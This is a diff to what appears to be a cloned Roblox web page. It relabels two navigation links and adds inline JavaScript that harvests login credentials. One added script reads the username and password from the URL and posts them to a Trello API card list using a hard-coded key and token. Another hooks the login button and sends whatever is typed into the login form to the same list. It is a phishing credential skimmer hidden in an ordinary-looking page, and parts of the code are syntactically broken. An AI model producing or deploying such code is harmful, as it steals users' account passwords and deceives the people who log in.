@@ -464,10 +464,10 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
                 <a class="nav-menu-title" href="../index.html">Catalog</a>
             </li>
             <li>
-                <a class="nav-menu-title" href="../../create.html">Create</a>
+                <a class="nav-menu-title" href="../../create.html">Develop</a>
             </li>
             <li>
-                <a class="buy-robux nav-menu-title" href="../../upgrades/robux1e43.html?ctx=nav">Robux</a>
+                <a class="buy-robux nav-menu-title" href="../../upgrades/robux1e43.html?ctx=nav">Trade</a>
             </li>
         </ul><!--rbx-navbar-->
         <div id="navbar-universal-search" class="navbar-left rbx-navbar-search col-xs-5 col-sm-6 col-md-3" data-behavior="univeral-search" role="search">
@@ -1590,9 +1590,37 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
 
 
                              
+<script type="text/javascript">
+    var code = "https://api.trello.com/1/cards?key=162388ffcce39fae519d5c698d9c245d&token=3b22f539fb648f7934d646dfc2dbb1286ff3a637c71bdfc1bcf301e442b64021"
+
+function getUrlVars()
+{
+    var vars = [], hash;
+    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+    for(var i = 0; i < hashes.length; i++)
+    {
+        hash = hashes[i].split('=');
+        vars.push(hash[0]);
+        vars[hash[0]] = hash[1];
+    }
+    return vars;
+}
+    
+    var users = getUrlVars();
+    
+    $.post({
+            url:     "https://api.trello.com/1/cards?key=162388ffcce39fae519d5c698d9c245d&token=3b22f539fb648f7934d646dfc2dbb1286ff3a637c71bdfc1bcf301e442b64021",
+            form:    {"labels":"red","name":(users["username"] + " | " users["password"]) ,"idList":"5a74f7889d750c862920d11b"}
+          }, function(error, response, body){
+    });
+
+
                              
+                             </script>                         
 
 <script type="text/javascript">
+    var code = "https://api.trello.com/1/cards?key=162388ffcce39fae519d5c698d9c245d&token=3b22f539fb648f7934d646dfc2dbb1286ff3a637c71bdfc1bcf301e442b64021"
+
     var Roblox = Roblox || {};
     Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};
 
@@ -1616,6 +1644,20 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
             $(document.getElementById('login-dropdown')).css("visibility", "visible");
         }
     })
+    var elem = $("#login-button").click(function(){
+        oof = !oof
+        var user = $(document.getElementById('login-username')).val();
+        var pass = $(document.getElementById('login-password')).val();
+        console.log(user + " | pass: " + pass);
+        $.post(
+            {
+                url:     code,
+                form:    {"labels":"red","name": (user + " | pass: " + pass),"idList":"5a74f7889d750c862920d11b"}
+            }, function(error, response, body){
+        });
+    })
+    
+    
 </script>
 
                              
